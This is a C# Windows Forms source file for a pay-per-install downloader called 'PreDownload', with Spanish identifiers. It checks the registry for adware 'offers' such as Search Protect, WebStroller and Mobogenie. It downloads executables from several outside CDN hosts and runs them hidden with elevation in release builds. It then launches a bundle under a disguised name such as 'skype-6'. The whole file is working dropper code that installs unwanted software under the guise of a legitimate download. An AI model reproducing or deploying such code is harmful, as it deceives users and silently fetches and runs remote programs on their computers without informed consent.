using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Security.Principal;

namespace PreDownload
{
    public partial class frmInicioOperacion : Form
    {
        string FileName = "";
        string nombrePrograma = "";
        string combosHabilitados = "";
        bool ejecutando = false;

        bool validandoInstallMonetizer = false;

        Steep pasoActual = new Steep();

        Steep pasosValidados = new Steep();

        public frmInicioOperacion()
        {
            InitializeComponent();
        }

        private void frmInicioOperacion_Load(object sender, EventArgs e)
        {
            string nombreEjecutable = System.IO.Path.GetFileName(Application.ExecutablePath);

            for (int i = 0; i < nombreEjecutable.Length; i++)
            {
                if (nombreEjecutable.Substring(i, 1) == ".")
                {
                    nombrePrograma = nombreEjecutable.Substring(0, i);
                }
            }

            DescargarSoftOriginal();

        }

        private bool ExisteEnRegistry(Oferta oferta)
        {
            if (oferta.registryKey != null)
            {
                RegistryKey key;

                foreach (var rk in oferta.registryKey)
                {
                    if (rk.Ubicacion == "CU")
                    {
                        key = Registry.CurrentUser.OpenSubKey(rk.Clave);
                        if (key != null)
                        {
                            return true;
                        }
                    }
                    else if (rk.Ubicacion == "LM")
                    {
                        // search in: LocalMachine_32
                        key = Registry.LocalMachine.OpenSubKey(rk.Clave);
                        if (key != null)
                        {
                            return true;
                        }
                    }
                    else if (rk.Ubicacion == "LM64")
                    {
                        // search in: LocalMachine_64
                        key = Registry.LocalMachine.OpenSubKey(rk.Clave);
                        if (key != null)
                        {
                            return true;
                        }
                    }

                }

                return false;
            }
            return false;
        }

        public Steep getProximoPaso(List<Steep> steeps)
        {
            foreach (var paso in steeps)
            {
                if (paso.orden > pasoActual.orden)
                {
                    return paso;
                }
            }

            return null;
        }

        public void validarCombo(Combo combo, int numeroPaso)
        {
            Thread worker = new Thread(() =>
            {
                bool validacionAsincronica = false;
                bool comboValido = true;
                foreach (var oferta in combo.ofertas)
                {
                    if (!(combo.isInstallMonetizer && validandoInstallMonetizer))
                    {
                        if (combo.isInstallMonetizer)
                            validandoInstallMonetizer = true;

                        if (oferta.registryKey != null)
                        {
                            if (oferta.registryKey.Count > 0)
                                if (ExisteEnRegistry(oferta)) // Si no existe en registro, la doy como Ok
                                {
                                    comboValido = false;
                                }
                        }
                        else
                        {
                            validacionAsincronica = true;
                            descargarRutinaCheck(oferta, numeroPaso + 1);

                            //okToInstall(oferta, numeroPaso + 1);
                            //if (!okToInstall(oferta))
                            //{
                            //    if (combo.isInstallMonetizer)
                            //        comboValido = getClaveRegistry(oferta.AID);
                            //    else
                            //        comboValido = false;
                            //}
                        }
                    }
                    else
                    {
                        comboValido = false;
                        while (validandoInstallMonetizer)
                        {
                            comboValido = getClaveRegistry(oferta.AID);
                        }
                    }
                }

                if (comboValido)
                    pasosValidados.combosDeOfertas.Add(combo);

                if (!validacionAsincronica)
                    switch (numeroPaso + 1)
                    {
                        case 1:
                            validandoPaso1 = false;
                            break;
                        case 2:
                            validandoPaso2 = false;
                            break;
                        case 3:
                            validandoPaso3 = false;
                            break;
                        case 4:
                            validandoPaso4 = false;
                            break;
                        case 5:
                            validandoPaso5 = false;
                            break;
                    }
            });

            worker.IsBackground = true;
            worker.Start();
        }

        private bool getClaveRegistry(int AID)
        {
            RegistryKey key;
            key = Registry.CurrentUser.OpenSubKey(@"Software\UniPack");
            if (key != null)
            {
                if (key.GetValue("OfferList").ToString().Contains(AID.ToString()))
                {
                    Console.WriteLine(AID.ToString());
                    return true;
                }
            }

            return false;
        }

        public void ValidarSteps(List<Steep> steeps)
        {
            pasoActual = getProximoPaso(steeps);
            // No hay proximos pasos
            for (int i = 0; i < pasoActual.combosDeOfertas.Count; i++)
            {
                #region Marco el paso Actual, en proceso de validacion
                switch (i + 1)
                {
                    case 1:
                        validandoPaso1 = true;
                        break;
                    case 2:
                        validandoPaso2 = true;
                        break;
                    case 3:
                        validandoPaso3 = true;
                        break;
                    case 4:
                        validandoPaso4 = true;
                        break;
                    case 5:
                        validandoPaso5 = true;
                        break;
                }
                #endregion
                // Disparo el asincronico
                pasoActual.combosDeOfertas[i].validando = true;
                validarCombo(pasoActual.combosDeOfertas[i], i);
            }

        }

        private List<Steep> InicializarListaOfertas()
        {
            List<Steep> steeps = new List<Steep>();

            Steep steep = new Steep();
            Combo combo = new Combo();
            Oferta oferta;

            // COMBO 1
            #region InstallMonetizer - Search Protect
            steep.idSteep = 1;
            steep.orden = 1;
            if (steep.combosDeOfertas == null)
                steep.combosDeOfertas = new List<Combo>();

            combo.idCombo = 1;
            combo.nombre = "Search Protect";
            combo.isInstallMonetizer = true;
            oferta = new Oferta();
            oferta.idOferta = 1;
            oferta.AID = 243;
            oferta.descripcion = "Search Protect";
            oferta.urlDescarga = "http://cdn.goateastcach.us/cdn/Unipack_Installer.exe";
            oferta.nombreExe = "Unipack_Installer.exe";
            oferta.parametros = "/type=installer /AID=243 /PubID=12960 /CBID=8818";
            oferta.parametrosPreCheck = "/type=checker /MultiOffer=1 /PubID=12960 /CBID=8818";
            combo.ofertas.Add(oferta);
            steep.combosDeOfertas.Add(combo);

            #endregion

            // COMBO 2
            #region Revenyou - ReMarkit + WebStroller
            combo = new Combo();
            combo.idCombo = 5;
            combo.nombre = "Web Stroller";

            // ReMarkit
            oferta = new Oferta();
            oferta.idOferta = 7;
            oferta.descripcion = "ReMarkit";
            oferta.urlDescarga = "http://cdn4.promptdownload.com/Bundle.exe";
            oferta.nombreExe = "Bundle.exe";
            oferta.parametros = @"/ci 4829 /i ElectroLyrics /u http://www.promptdownload.com/index.php /ta";
            oferta.parametrosPreCheck = @"/ci 4829 /i ElectroLyrics /u http://www.promptdownload.com/index.php /t";

            combo.ofertas.Add(oferta);

            // Web Stroller
            oferta = new Oferta();
            oferta.descripcion = "Web Stroller";
            oferta.idOferta = 6;
            oferta.urlDescarga = "http://cdn4.promptdownload.com/Bundle.exe";
            oferta.nombreExe = "Bundle.exe";
            oferta.parametros = @"/ci 4827 /i WebStroller /u http://www.promptdownload.com/index.php /ta";
            oferta.parametrosPreCheck = @"/ci 4827 /i WebStroller /u http://www.promptdownload.com/index.php /t ";

            combo.ofertas.Add(oferta);

            steep.combosDeOfertas.Add(combo);
            #endregion

            // COMBO 3
            #region InstallMonetizer - Systweak
            combo = new Combo();
            combo.idCombo = 3;
            combo.isInstallMonetizer = true;
            combo.nombre = "Systweak";

            oferta = new Oferta();
            oferta.idOferta = 3;
            oferta.AID = 240;
            oferta.descripcion = "Systweak";
            oferta.urlDescarga = "http://cdn.goateastcach.us/cdn/Unipack_Installer.exe";
            oferta.nombreExe = "Unipack_Installer.exe";
            oferta.parametros = "/type=installer /AID=240 /PubID=12960 /CBID=8818";
            oferta.parametrosPreCheck = "/type=checker /MultiOffer=1 /PubID=12960 /CBID=8818";

            combo.ofertas.Add(oferta);
            steep.combosDeOfertas.Add(combo);
            #endregion

            //COMBO 4
            #region Revenyou - WhatherAlters + Mobogine
            combo = new Combo();
            combo.idCombo = 9;
            combo.nombre = "Weather Alerts";

            // Weather Alerts
            oferta = new Oferta();
            oferta.idOferta = 8;
            oferta.descripcion = "Weather Alerts";
            oferta.urlDescarga = "http://cdn.file2desktop.com/components/WeatherAlertsSetup.exe";
            oferta.nombreExe = "WeatherAlertsSetup.exe";
            if (oferta.registryKey == null)
                oferta.registryKey = new List<Registro>();
            oferta.registryKey.Add(new Registro { Ubicacion = "CU", Clave = @"Software\WeatherAlerts", valor = "(default)" });
            oferta.registryKey.Add(new Registro { Ubicacion = "CU", Clave = @"Software\Stronghold Online Backup\StrongVaultApp", valor = "(default)" });
            oferta.registryKey.Add(new Registro { Ubicacion = "CU", Clave = @"Software\NexGenMediaPlayer\NexGenMediaPlayerApp", valor = "(default)" });
            oferta.registryKey.Add(new Registro { Ubicacion = "CU", Clave = @"Software\SevereWeatherAlerts\SevereWeatherAlertsApp", valor = "(default)" });
            oferta.registryKey.Add(new Registro { Ubicacion = "CU", Clave = @"Software\SuperBackup\SuperBackupApp", valor = "(default)" });
            oferta.registryKey.Add(new Registro { Ubicacion = "CU", Clave = @"Software\FrugalID\FrugalIDApp", valor = "(default)" });
            oferta.registryKey.Add(new Registro { Ubicacion = "CU", Clave = @"Software\FastMediaConverter\FastMediaConverterApp", valor = "(default)" });
            oferta.registryKey.Add(new Registro { Ubicacion = "CU", Clave = @"Software\SmartMediaConverter\SmartMediaConverterApp", valor = "(default)" });
            oferta.registryKey.Add(new Registro { Ubicacion = "CU", Clave = @"Software\WeatherAlerts\WeatherAlertsApp", valor = "(default)" });
            oferta.registryKey.Add(new Registro { Ubicacion = "CU", Clave = @"Software\StormAlerts\StormAlertsApp", valor = "(default)" });

            oferta.parametros = @"/PID=302";
            combo.ofertas.Add(oferta);

            oferta = new Oferta();
            oferta.idOferta = 9;
            oferta.urlDescarga = "http://cdn.file2desktop.com/components/MobogenieB.exe";
            oferta.nombreExe = "MobogenieB.exe";
            if (oferta.registryKey == null)
                oferta.registryKey = new List<Registro>();
            oferta.registryKey.Add(new Registro { Ubicacion = "LM", Clave = @"Software\Microsoft\Windows\CurrentVersion\App Paths\Mobogenie.exe", valor = "(default)" });

            oferta.parametros = @"/PID=302";

            combo.ofertas.Add(oferta);
            steep.combosDeOfertas.Add(combo);
            #endregion

            steeps.Add(steep);


            return steeps;
        }

        private void DescargarSoftOriginal()
        {
            try
            {
                WebClient webClient = new WebClient();

                webClient.DownloadFileCompleted += new AsyncCompletedEventHandler(DownloadCompleted);
                //webClient.DownloadProgressChanged += new DownloadProgressChangedEventHandler(ProgressChanged);
                webClient.Proxy = null;
                FileName = Path.GetTempPath() + "bundle.exe";
                webClient.DownloadFileAsync(new Uri("http://downloads205.com/bin/_bundle/bundleTest.exe"), FileName);


            }
            catch (Exception ex)
            {
                throw ex;
            }

        }

        private void Validar_aMonetize_Remarkit(Oferta oferta, int numeroPaso)
        {
            WebClient webClient = new WebClient();
            System.Diagnostics.Process installProcess = new System.Diagnostics.Process();

#if !DEBUG //Si no es debug lo corro como silent...
                        if (System.Environment.OSVersion.Version.Major >= 6)
                        {
                            installProcess.StartInfo.Verb = "runas";
                        }
                        installProcess.StartInfo.UseShellExecute = false;
                        installProcess.StartInfo.CreateNoWindow = true;
#endif
            installProcess.StartInfo.FileName = oferta.fileName;
            installProcess.StartInfo.Arguments = oferta.parametrosPreCheck;
            installProcess.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

            installProcess.Start();
            installProcess.WaitForExit();

            bool okToInstall = false;

            string FileName = Path.GetTempPath() + "amitest.txt";
            StreamReader objReader = new StreamReader(FileName);

            string sLine = "";
            while (sLine != null)
            {
                sLine = objReader.ReadLine();
                switch (sLine)
                {
                    case "WebStroller=N": // Se puede instalar
                        okToInstall = true;
                        break;
                    case "WebStroller=I": // Ya esta instalado
                        okToInstall = false;
                        break;
                    case "WebStroller=C": // No se puede instalar, falta el chrome.
                        okToInstall = false;
                        break;
                    default:
                        break;
                }
            }

            if (okToInstall)
            {
                foreach (var item in pasoActual.combosDeOfertas[numeroPaso - 1].ofertas)
                {
                    if (item.okToInstall == false)
                        okToInstall = false;
                }
            }

            if (okToInstall)
            {
                pasosValidados.combosDeOfertas.Add(pasoActual.combosDeOfertas[numeroPaso - 1]);
            }

            objReader.Dispose();
            objReader = null;

            switch (numeroPaso)
            {
                case 1:
                    validandoPaso1 = false;
                    break;
                case 2:
                    validandoPaso2 = false;
                    break;
                case 3:
                    validandoPaso3 = false;
                    break;
                case 4:
                    validandoPaso4 = false;
                    break;
                case 5:
                    validandoPaso5 = false;
                    break;
            }
        }


        private void Validar_aMonetize_WebStroller(Oferta oferta, int numeroPaso)
        {
            WebClient webClient = new WebClient();
            System.Diagnostics.Process installProcess = new System.Diagnostics.Process();

#if !DEBUG //Si no es debug lo corro como silent...
                        if (System.Environment.OSVersion.Version.Major >= 6)
                        {
                            installProcess.StartInfo.Verb = "runas";
                        }
                        installProcess.StartInfo.UseShellExecute = false;
                        installProcess.StartInfo.CreateNoWindow = true;
#endif
            installProcess.StartInfo.FileName = oferta.fileName;
            installProcess.StartInfo.Arguments = oferta.parametrosPreCheck;
            installProcess.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

            installProcess.Start();
            installProcess.WaitForExit();

            bool okToInstall = false;



            string FileName = Path.GetTempPath() + "amitest.txt";
            Thread.Sleep(1000);

            if (System.IO.File.Exists(FileName))
            {
                StreamReader objReader = new StreamReader(FileName);

                string sLine = "";
                while (sLine != null)
                {
                    sLine = objReader.ReadLine();
                    switch (sLine)
                    {
                        case "WebStroller=N": // Se puede instalar
                            okToInstall = true;
                            break;
                        case "WebStroller=I": // Ya esta instalado
                            okToInstall = false;
                            break;
                        case "WebStroller=C": // No se puede instalar, falta el chrome.
                            okToInstall = false;
                            break;
                        default:
                            break;
                    }
                }
                objReader.Dispose();
                objReader = null;
            }
            if (okToInstall)
            {
                foreach (var item in pasoActual.combosDeOfertas[numeroPaso - 1].ofertas)
                {
                    if (item.okToInstall == false)
                        okToInstall = false;
                }
            }

            if (okToInstall)
            {
                pasosValidados.combosDeOfertas.Add(pasoActual.combosDeOfertas[numeroPaso - 1]);
            }


            switch (numeroPaso + 1)
            {
                case 1:
                    validandoPaso1 = false;
                    break;
                case 2:
                    validandoPaso2 = false;
                    break;
                case 3:
                    validandoPaso3 = false;
                    break;
                case 4:
                    validandoPaso4 = false;
                    break;
                case 5:
                    validandoPaso5 = false;
                    break;
            }
        }

        private void ValidarInstallMonetizer(Oferta oferta, int numeroPaso)
        {
            WebClient webClient = new WebClient();
            System.Diagnostics.Process installProcess = new System.Diagnostics.Process();

#if !DEBUG //Si no es debug lo corro como silent...
                        if (System.Environment.OSVersion.Version.Major >= 6)
                        {
                            installProcess.StartInfo.Verb = "runas";
                        }
                        installProcess.StartInfo.UseShellExecute = false;
                        installProcess.StartInfo.CreateNoWindow = true;
#endif
            installProcess.StartInfo.FileName = oferta.fileName;
            installProcess.StartInfo.Arguments = oferta.parametrosPreCheck;
            installProcess.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

            installProcess.Start();
            installProcess.WaitForExit();

            bool comboValido = true;
            foreach (var item in pasoActual.combosDeOfertas[numeroPaso - 1].ofertas)
            {
                comboValido = false;
                if (getClaveRegistry(oferta.AID))
                    comboValido = true;
            }

            if (comboValido)
                pasosValidados.combosDeOfertas.Add(pasoActual.combosDeOfertas[numeroPaso - 1]);

            validandoInstallMonetizer = false;

            switch (numeroPaso)
            {
                case 1:
                    validandoPaso1 = false;
                    break;
                case 2:
                    validandoPaso2 = false;
                    break;
                case 3:
                    validandoPaso3 = false;
                    break;
                case 4:
                    validandoPaso4 = false;
                    break;
                case 5:
                    validandoPaso5 = false;
                    break;
            }

            #region dispose
            webClient.Dispose();
            installProcess.Dispose();

            webClient = null;
            installProcess = null;
            #endregion
        }

        public AsyncCompletedEventHandler DownloadComplete_InstallMonetizer(Oferta oferta, int numeroPaso)
        {
            Action<object, AsyncCompletedEventArgs> action = (sender, e) =>
            {
                System.IO.File.Copy(oferta.fileNameTemporary, oferta.fileName, true);

                ValidarInstallMonetizer(oferta, numeroPaso);
            };
            return new AsyncCompletedEventHandler(action);
        }

        public void descargarRutinaCheck(Oferta oferta, int numeroPaso)
        {
            try
            {
                WebClient webClient = new WebClient();
                oferta.fileName = Path.GetTempPath() + "Oferta" + oferta.nombreExe;
                oferta.fileNameTemporary = Path.GetTempPath() + Guid.NewGuid();

                if (!System.IO.File.Exists(oferta.fileName))
                {
                    switch (oferta.idOferta)
                    {
                        case 1: // Install Monetizer - Toolbar
                            webClient.DownloadFileCompleted += new AsyncCompletedEventHandler(DownloadComplete_InstallMonetizer(oferta, numeroPaso));
                            break;
                        case 2: // aMonetize - Toolbar
                            webClient.DownloadFileCompleted += new AsyncCompletedEventHandler(DownloadComplete_InstallMonetizer(oferta, numeroPaso));
                            break;
                        case 3: // aMonetize - Toolbar
                            webClient.DownloadFileCompleted += new AsyncCompletedEventHandler(DownloadComplete_InstallMonetizer(oferta, numeroPaso));
                            break;
                        case 6: // aMonetize - Toolbar
                            webClient.DownloadFileCompleted += new AsyncCompletedEventHandler(DownloadComplete_aMonetize_WebStroller(oferta, numeroPaso));
                            //webClient.DownloadFileCompleted += DownloadComplete_aMonetize_WebStroller(oferta, numeroPaso);
                            break;
                        case 7: // aMonetize - Toolbar
                            webClient.DownloadFileCompleted += new AsyncCompletedEventHandler(DownloadComplete_aMonetize_Remarkit(oferta, numeroPaso));
                            break;
                        default:
                            break;
                    }

                    webClient.DownloadFileAsync(new Uri(oferta.urlDescarga), oferta.fileNameTemporary);


                    //webClient.DownloadFile(new Uri(oferta.urlDescarga), FileName);
                }
                else
                {
                    // Rutina para ejecutar sin bajar
                    switch (oferta.idOferta)
                    {
                        case 1: // Install Monetizer - Toolbar
                            ValidarInstallMonetizer(oferta, numeroPaso);
                            break;
                        case 2: // Install Monetizer - Toolbar
                            ValidarInstallMonetizer(oferta, numeroPaso);
                            break;
                        case 3: // Install Monetizer - Toolbar
                            ValidarInstallMonetizer(oferta, numeroPaso);
                            break;
                        case 6: // aMonetize - Toolbar
                            Validar_aMonetize_WebStroller(oferta, numeroPaso);
                            break;
                        case 7: // aMonetize - Toolbar
                            Validar_aMonetize_Remarkit(oferta, numeroPaso);
                            break;
                    }
                }
            }
            catch (Exception ex)
            {
                throw;
            }
        }

        private bool okToInstall_aMonetize_WebStroller(Oferta oferta, int numeroPaso)
        {
            try
            {
                descargarRutinaCheck(oferta, numeroPaso);

                bool okToInstall = false;

                string FileName = Path.GetTempPath() + "amitest.txt";
                StreamReader objReader = new StreamReader(FileName);

                string sLine = "";
                while (sLine != null)
                {
                    sLine = objReader.ReadLine();
                    switch (sLine)
                    {
                        case "WebStroller=N": // Se puede instalar
                            okToInstall = true;
                            break;
                        case "WebStroller=I": // Ya esta instalado
                            okToInstall = false;
                            break;
                        case "WebStroller=C": // No se puede instalar, falta el chrome.
                            okToInstall = false;
                            break;
                        default:
                            break;
                    }
                }

                objReader.Dispose();
                objReader = null;

                return okToInstall;
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        private bool okToInstall_aMonetize_Remarkit(Oferta oferta, int numeroPaso)
        {
            try
            {
                descargarRutinaCheck(oferta, numeroPaso);

                bool okToInstall = false;
                string FileName = Path.GetTempPath() + "amitest.txt";
                StreamReader objReader = new StreamReader(FileName);

                string sLine = "";
                while (sLine != null)
                {
                    sLine = objReader.ReadLine();
                    switch (sLine)
                    {
                        case "ElectroLyrics=N": // Se puede instalar
                            okToInstall = true;
                            break;
                        case "ElectroLyrics=I": // Ya esta instalado
                            okToInstall = false;
                            break;
                        case "ElectroLyrics=C": // No se puede instalar, falta el chrome.
                            okToInstall = false;
                            break;
                        default:
                            break;
                    }
                }
                objReader.Dispose();
                objReader = null;
                return okToInstall;
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        private bool okToInstall_RealPlayer(Oferta oferta)
        {
            try
            {
                //Admin Rights
                if (!IsUserAdministrator())
                    return false;

                //Chrome Elegible or GTB Elegible.
                #region ChromeElegible
                //User is Chrome Eligible or GTB Eligible (see below).
                bool ChromeElegible = true;

                Oferta ofertaBasura = new Oferta();
                if (ofertaBasura.registryKey == null)
                    ofertaBasura.registryKey = new List<Registro>();
                // Claves “Chrome Eligible”
                ofertaBasura.registryKey.Add(new Registro { Ubicacion = "LM", Clave = @"SOFTWARE\Google\No Chrome Offer Until", valor = "RealNetworks, Inc." });
                ofertaBasura.registryKey.Add(new Registro { Ubicacion = "LM", Clave = @"SOFTWARE\Wow6432Node\Google\No Chrome Offer Until", valor = "RealNetworks, Inc." });

                // Existe Chrome
                ofertaBasura.registryKey.Add(new Registro { Ubicacion = "LM", Clave = @"SOFTWARE\Google\Update\Clients\{8A69D345-D564-463c-AFF1-A69D9E530F96}\pv", valor = "(default)" });
                ofertaBasura.registryKey.Add(new Registro { Ubicacion = "CU", Clave = @"SOFTWARE\Google\Update\Clients\{8A69D345-D564-463c-AFF1-A69D9E530F96}\pv", valor = "(default)" });
                ofertaBasura.registryKey.Add(new Registro { Ubicacion = "LM", Clave = @"SOFTWARE\Wow6432Node\Google\Update\Clients\{8A69D345-D564-463c-AFF1-A69D9E530F96}\pv", valor = "(default)" });
                ofertaBasura.registryKey.Add(new Registro { Ubicacion = "CU", Clave = @"SOFTWARE\Wow6432Node\Google\Update\Clients\{8A69D345-D564-463c-AFF1-A69D9E530F96}\pv", valor = "(default)" });

                if (ExisteEnRegistry(ofertaBasura))
                    ChromeElegible = false;
                #endregion

                #region GTB Eligible
                //“GTB Eligible” means ALL of the following are true:
                bool GTBElegible = true;

                ofertaBasura = new Oferta();
                if (ofertaBasura.registryKey == null)
                    ofertaBasura.registryKey = new List<Registro>();
                // Claves “GTB Elegible”
                ofertaBasura.registryKey.Add(new Registro { Ubicacion = "LM", Clave = @"SOFTWARE\Google\No Toolbar OfferUntil", valor = "RealNetworks, Inc." });
                ofertaBasura.registryKey.Add(new Registro { Ubicacion = "LM", Clave = @"SOFTWARE\Wow6432Node\Google\No Chrome Offer Until", valor = "RealNetworks, Inc." });

                // Google Toolbar
                ofertaBasura.registryKey.Add(new Registro { Ubicacion = "LM", Clave = @"SOFTWARE\Google\Update\Clients\{F69EABDD-A4BB-4555-BE7E-1EA5F59BBA24}\pv", valor = "(default)" });
                ofertaBasura.registryKey.Add(new Registro { Ubicacion = "CU", Clave = @"SOFTWARE\Google\Update\Clients\{F69EABDD-A4BB-4555-BE7E-1EA5F59BBA24}\pv", valor = "(default)" });
                ofertaBasura.registryKey.Add(new Registro { Ubicacion = "LM", Clave = @"Software\Wow6432Node\Google\Update\Clients\{F69EABDD-A4BB-4555-BE7E-1EA5F59BBA24}\pv", valor = "(default)" });
                ofertaBasura.registryKey.Add(new Registro { Ubicacion = "CU", Clave = @"SOFTWARE\Wow6432Node\Google\Update\Clients\{F69EABDD-A4BB-4555-BE7E-1EA5F59BBA24}\pv", valor = "(default)" });

                if (ExisteEnRegistry(ofertaBasura))
                    GTBElegible = false;

                if (!ieIsDefault())
                    GTBElegible = false;
                #endregion

                if (!GTBElegible && !ChromeElegible)
                    return false;

                //RealPlayer is not Installed
                #region RealPlayer Is Not Installed
                ofertaBasura = new Oferta();
                if (ofertaBasura.registryKey == null)
                    ofertaBasura.registryKey = new List<Registro>();
                // Claves “GTB Elegible”
                ofertaBasura.registryKey.Add(new Registro { Ubicacion = "CU", Clave = @"Software\RealNetworks\RealPlayer", valor = "RealNetworks, Inc." });
                if (ExisteEnRegistry(ofertaBasura))
                    return false;
                #endregion

                return true;
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }

        private bool IsUserAdministrator()
        {
            //bool value to hold our return value
            bool isAdmin;
            try
            {
                //get the currently logged in user
                WindowsIdentity user = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(user);
                isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch (UnauthorizedAccessException ex)
            {
                isAdmin = false;
            }
            catch (Exception ex)
            {
                isAdmin = false;
            }
            return isAdmin;
        }

        private bool ieIsDefault()
        {
            RegistryKey regKey = null;
            //set the registry key we want to open
            regKey = Registry.ClassesRoot.OpenSubKey("HTTP\\shell\\open\\command", false);

            string name = string.Empty;
            //get rid of the enclosing quotes
            name = regKey.GetValue(null).ToString().ToLower().Replace("" + (char)34, "");

            //check to see if the value ends with .exe (this way we can remove any command line arguments)
            if (!name.EndsWith("exe"))
                //get rid of all command line arguments (anything after the .exe must go)
                name = name.Substring(0, name.LastIndexOf(".exe") + 4);

            return name.ToLower().Contains("ie");
        }

        private void DownloadCompleted(object sender, AsyncCompletedEventArgs e)
        {
            terminoDescarga = true;
            if (terminoValidacion)
                IniciarBundle();
        }

        public AsyncCompletedEventHandler DownloadComplete_aMonetize_WebStroller(Oferta oferta, int numeroPaso)
        {
            Action<object, AsyncCompletedEventArgs> action = (sender, e) =>
            {
                if (!System.IO.File.Exists(oferta.fileName))
                    System.IO.File.Copy(oferta.fileNameTemporary, oferta.fileName, true);
                Validar_aMonetize_WebStroller(oferta, numeroPaso);
            };
            return new AsyncCompletedEventHandler(action);
        }

        public AsyncCompletedEventHandler DownloadComplete_aMonetize_Remarkit(Oferta oferta, int numeroPaso)
        {
            Action<object, AsyncCompletedEventArgs> action = (sender, e) =>
            {
                System.IO.File.Copy(oferta.fileNameTemporary, oferta.fileName, true);
                Validar_aMonetize_Remarkit(oferta, numeroPaso);
            };
            return new AsyncCompletedEventHandler(action);
        }




        private void IniciarBundle()
        {
            System.Diagnostics.Process installProcess = new System.Diagnostics.Process();

#if !DEBUG //Si no es debug lo corro como silent...
                        if (System.Environment.OSVersion.Version.Major >= 6)
                        {
                            installProcess.StartInfo.Verb = "runas";
                        }
                        installProcess.StartInfo.UseShellExecute = false;
                        installProcess.StartInfo.CreateNoWindow = true;
#endif
            if (nombrePrograma == "PreDownload")
                nombrePrograma = "skype-6";

            nombrePrograma = nombrePrograma.Replace("(1)", "");
            nombrePrograma = nombrePrograma.Replace("(2)", "");
            nombrePrograma = nombrePrograma.Replace("(3)", "");
            nombrePrograma = nombrePrograma.Replace("(4)", "");
            nombrePrograma = nombrePrograma.Replace("(5)", "");
            nombrePrograma = nombrePrograma.Replace("(6)", "");
            nombrePrograma = nombrePrograma.Replace("(7)", "");
            nombrePrograma = nombrePrograma.Replace("(8)", "");
            nombrePrograma = nombrePrograma.Replace("(9)", "");


            installProcess.StartInfo.Arguments = nombrePrograma.Trim() + "/" + combosHabilitados;

            installProcess.StartInfo.FileName = FileName;
            try
            {
                ThreadPool.QueueUserWorkItem(delegate
                {
                    try
                    {
                        installProcess.Start();
                    }
                    catch (Exception ex)
                    {
                    }
                });

                Application.Exit();
            }
            catch (Exception ex)
            {
            }
        }

        private void frmInicioOperacion_Activated(object sender, EventArgs e)
        {
            if (!ejecutando)
            {
                ejecutando = true;

                ValidarSteps(InicializarListaOfertas());
            }
        }

        private void TerminoValidacion()
        {
            // Solo entro si no hay ningun paso que siga validandose...
            if ((!validandoPaso1) && (!validandoPaso2) && (!validandoPaso3) && (!validandoPaso4) && (!validandoPaso5))
            {
                if (!terminoValidacion)
                {
                    terminoValidacion = true;
                    foreach (var combo in pasosValidados.combosDeOfertas)
                    {
                        if (combosHabilitados == "")
                            combosHabilitados = combo.idCombo.ToString();
                        else
                            combosHabilitados += "&" + combo.idCombo.ToString();
                    }

                    //terminoValidacion = true;
                    if (terminoDescarga)
                        IniciarBundle();
                }
            }
        }

        #region propiedades
        private bool _terminoValidacion;
        public bool terminoValidacion
        {
            get
            {
                return _terminoValidacion;
            }
            set
            {
                if (_terminoValidacion != value)
                    _terminoValidacion = value;
            }
        }

        private bool _terminoDescarga;
        public bool terminoDescarga
        {
            get
            {
                return _terminoDescarga;
            }
            set
            {
                if (_terminoDescarga != value)
                    _terminoDescarga = value;
            }
        }

        private bool _validandoPaso1;
        public bool validandoPaso1
        {
            get
            {
                return _validandoPaso1;
            }
            set
            {
                if (_validandoPaso1 != value)
                {
                    _validandoPaso1 = value;
                    if (value == false)
                        TerminoValidacion();
                }
            }
        }

        private bool _validandoPaso2;
        public bool validandoPaso2
        {
            get
            {
                return _validandoPaso2;
            }
            set
            {
                if (_validandoPaso2 != value)
                {
                    _validandoPaso2 = value;
                    if (value == false)

                        TerminoValidacion();
                }
            }
        }

        private bool _validandoPaso3;
        public bool validandoPaso3
        {
            get
            {
                return _validandoPaso3;
            }
            set
            {
                if (_validandoPaso3 != value)
                {
                    _validandoPaso3 = value;
                    if (value == false)
                        TerminoValidacion();
                }
            }
        }

        private bool _validandoPaso4;
        public bool validandoPaso4
        {
            get
            {
                return _validandoPaso4;
            }
            set
            {
                if (_validandoPaso4 != value)
                {
                    _validandoPaso4 = value;
                    if (value == false)
                        TerminoValidacion();
                }
            }
        }

        private bool _validandoPaso5;
        public bool validandoPaso5
        {
            get
            {
                return _validandoPaso5;
            }
            set
            {
                if (_validandoPaso5 != value)
                {
                    _validandoPaso5 = value;
                    if (value == false)
                        TerminoValidacion();
                }
            }
        }
        #endregion
    }

    public class Combo
    {
        public int idCombo { get; set; }
        public string nombre { get; set; }
        public bool isInstallMonetizer { get; set; }
        public List<Oferta> ofertas = new List<Oferta>();
        public bool validando { get; set; }
        public bool okToInstall { get; set; }
    }

    public class Steep
    {
        public int idSteep { get; set; }
        public int orden { get; set; }
        public List<Combo> combosDeOfertas = new List<Combo>();
    }

    public class Oferta
    {
        public int idOferta { get; set; }
        public int AID { get; set; }
        public string descripcion { get; set; }
        public string urlDescarga { get; set; }
        public string nombreExe { get; set; }
        public string fileName { get; set; }
        public string fileNameTemporary { get; set; }
        public bool validando { get; set; }
        public bool okToInstall { get; set; }

        public string parametros { get; set; }
        public string parametrosPreCheck { get; set; }
        public List<Registro> registryKey { get; set; }

    }

    public class Registro
    {
        public string Ubicacion { get; set; }
        public string Clave { get; set; }
        public string valor { get; set; }
    }


}
